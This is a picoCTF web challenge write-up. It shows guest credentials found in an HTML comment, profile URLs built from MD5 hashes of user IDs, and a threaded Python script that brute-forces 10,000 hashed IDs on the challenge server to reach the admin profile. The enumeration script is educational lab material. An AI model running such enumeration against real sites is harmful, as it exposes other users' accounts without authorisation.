+++
date = '2026-04-20'
draft = false
title = 'Pico Hashgate writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Overview

You have gotten access to an organisation's portal. Submit your email and password, and it redirects you to your profile. But be careful: just because access to the admin isn’t directly exposed doesn’t mean it’s secure. Maybe someone forgot that obscurity isn’t security... Can you find your way into the admin’s profile for this organisation and capture the flag? The website is running here.

---

In a comment, we find the guest creds, ` <!-- Email: guest@picoctf.org Password: guest -->`.

## Identifying the vulnerabilities

Logging in, we are redirected to the `/profile/user/e93028bdc1aacdfb3687181f2031765d` page. That hash, upon checking, is actually `3000`, the value of our ID: *Access level: Guest (ID: 3000). Insufficient privileges to view classified data. Only top-tier users can access the flag.*.

![challenge-screenshot](hash.png#center)

I tried a couple numbers, like 1, 3000, 2000, and so on, but I gave up and decided to brute force it. Here's the script:

```py
import requests
import hashlib
from utils.pretty_print import pretty_print
from concurrent.futures import ThreadPoolExecutor

url = "http://crystal-peak.picoctf.net:64460/profile/user/"
    
def try_user(i):
    hashed = hashlib.md5(str(i).encode())
    hashed_clean = str(hashed.hexdigest())
    url_hash = url + hashed_clean
    res = requests.get(url_hash)
    if 'User not found' not in res.text:
        pretty_print(res)

with ThreadPoolExecutor(max_workers=50) as executor:
    executor.map(try_user, range(0,10000))
```

And the result:

![challenge-screenshot](flag.png#center)










